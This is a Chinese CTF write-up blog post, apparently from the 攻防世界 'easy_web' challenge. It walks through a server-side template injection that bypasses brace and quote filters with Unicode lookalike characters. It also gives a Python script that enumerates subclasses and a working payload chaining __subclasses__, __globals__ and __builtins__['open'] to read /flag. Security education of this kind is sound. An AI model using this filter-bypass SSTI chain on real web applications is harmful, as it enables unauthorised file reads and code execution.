@@ -1,0 +1,70 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>攻防世界-easy_web | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>攻防世界-easy_web</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-08-24T13:13:58.312Z" id="date"> 2023-08-24</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-08-24T13:45:33.785Z" id="updated"> 2023-08-24</time></div></span><br><span>文章总字数: <div class="control">959</div></span><br><span>预计阅读时间: <div class="control">3 分钟</div></span></div></div><hr><div id="post-content"><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2>
+<p>easy_web</p>
+<h2 id="题目解题："><a href="#题目解题：" class="headerlink" title="题目解题："></a>题目解题：</h2>
+<p class='item-img' data-src='image-20230824212803697.png'><img src="image-20230824212803697.png" alt="image-20230824212803697"></p>
+<p>打开后如下，dirsearch扫目录没啥效果，源代码也没用，之后看了看该项目的cms信息</p>
+<p class='item-img' data-src='image-20230824212852649.png'><img src="image-20230824212852649.png" alt="image-20230824212852649"></p>
+<p>那基本可以是ssti了，不过尝试的时候过滤了{}，然后我就不知道如何入手了。。。只能跟着wp走：</p>
+<p>回归到首页发现</p>
+<p class='item-img' data-src='image-20230824212955061.png'><img src="image-20230824212955061.png" alt="image-20230824212955061">字符规范器，是不是找一些特殊字符可以恢复成<code>&#123;</code>这种形式，就找一下跟<code>&#123;</code>类似的特殊符号试一下</p>
+<p>特殊字符网址：<a target="_blank" rel="noopener" href="http://www.fhdq.net/">http://www.fhdq.net/</a></p>
+<p class='item-img' data-src='image-20230824213137884.png'><img src="image-20230824213137884.png" alt="image-20230824213137884"></p>
+<p>可以替换成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">︷︷config︸︸<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230824213202588.png'><img src="image-20230824213202588.png" alt="image-20230824213202588"></p>
+<p>在测试过程中发现单引号也被过滤掉，<code>＇</code>这个符号可以转换出<code>'</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">︷︷().__class__.__bases__[0].__subclasses__()︸︸<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230824214143820.png'><img src="image-20230824214143820.png" alt="image-20230824214143820"></p>
+<p><code>︷︷().__class__.__base__.__subclasses__()︸︸</code>返回一大堆，有人可能不知道接下来要干什么，这里看了大佬的分析,深有感触，这里返回的子类，接下来要去访问具体某一个子类的init方法，这里为什么要访问init方法呢，因为访问到init方法之后，你可以知道这个类是否被重写了，如果没有重写，会返回objecs字样，如图<br class='item-img' data-src='image-20230824214236666.png'><img src="image-20230824214236666.png" alt="image-20230824214236666"></p>
+<p>类没有被重写，是继承的object类,这些类不具备open方法来操作文件，达不到我们目的，我们就是要通过open来读取flag文件，所以我们需要去一个一个看，找到重写的子类，来通过调用open方法读取文件，当然这么多子类不可能一个一个手动去试，于是写了脚本，这里去burp爆破也可，比较方便</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> html<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br> <br>url = <span class="hljs-string">&#x27;http://61.147.171.105:55725&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>    data = &#123;<br>        <span class="hljs-string">&#x27;str&#x27;</span>: <span class="hljs-string">&#x27;︷︷().__class__.__base__.__subclasses__()[%d].__init__︸︸&#x27;</span> % i,<br>    &#125;<br>    res = requests.post(url=url, data=data)<br>    res_ = html.unescape(res.text)<br>    <span class="hljs-built_in">print</span>(res_)<br></code></pre></td></tr></table></figure>
+<p>​		这部分会看到所有的子类的init方法，接下来加个判断过滤一下就OK，我们接着注入，这里我们知道重写了init方法的子类后，通过<code>.__globals</code>__访问定义该类的模块的全局命名空间，</p>
+<p>​		解释下什么叫全局命名空间，在 Python 中，每个模块都有一个全局命名空间，用于存储该模块中定义的全局变量和函数。当一个类被定义在一个模块中时，它也可以访问该模块的全局命名空间中的变量和函数。所以我们可以通过访问 <strong>globals</strong> 属性来获得该模块的全局命名空间中的所有对象，包括全局变量和函数。这些对象可以被读取和修改，接下来介绍  <strong>builtins</strong> 是 Python 中一个内置的模块对象，他在python解释器启动时， <strong>builtins</strong> 对象就会被创建并且自动添加到全局命名空间中，因此 <strong>builtins</strong> 可以在认可地方访问， <strong>builtins</strong> 模块包含了很多内置函数，其中就包括我们这提要用的open（），所以我们通过__globals__来访问 <strong>builtins</strong> 模块中的open函数来达到读取flag文件的目的，</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;objects&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res_:<br>    <span class="hljs-built_in">print</span>(i, res_)<br></code></pre></td></tr></table></figure>
+<p>接下来给脚本加上这两行，就会输出重写init的子类并且加上序号，方便后续手动操作，当然脚本也可以</p>
+<p class='item-img' data-src='image-20230824214120896.png'><img src="image-20230824214120896.png" alt="image-20230824214120896"></p>
+<p>ok这里看到序号之后开始注入，这里选择75，当然所有输出的序号都可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">︷︷().__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__︸︸<br></code></pre></td></tr></table></figure>
+<p>会看到出现了很多内置函数，这里就有我们需要用的open（），接下来使用open访问flag文件读取就行了</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">︷︷().__class__.__base__.__subclasses__()[<span class="hljs-number">75</span>].__init__.__globals__.__builtins__[＇<span class="hljs-built_in">open</span>＇](＇/flag＇).read()︸︸ <br></code></pre></td></tr></table></figure>
+<p>这里需要注意，[]和()里面的符号是＇而不是单引号（被过滤），之后就读到flag了<br class='item-img' data-src='image-20230824214416653.png'><img src="image-20230824214416653.png" alt="image-20230824214416653"></p>
+<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shshsj11/article/details/130233615?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169288352816800226587667%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169288352816800226587667&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-130233615-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ceasy_web&amp;spm=1018.2226.3001.4187">深入理解SSTI. 攻防世界easy_web 附python脚本</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44418229/article/details/125970622?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169288352816800226587667%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169288352816800226587667&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-125970622-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ceasy_web&amp;spm=1018.2226.3001.4187">攻防世界–easy_web</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63928796/article/details/125941196?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169288352816800226587667%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169288352816800226587667&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-125941196-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ceasy_web&amp;spm=1018.2226.3001.4187">攻防世界easy_web</a></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/08/24/unfinish/">攻防世界-unfinish 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">题目描述：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E9%A2%98%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">题目解题：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">参考文章：</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+window.waline = init;
+</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
+ waline({
+   el: '#waline',
+   dark: ':root[theme-mode="dark"]',
+   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
+   path: window.location.pathname,
+ });document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
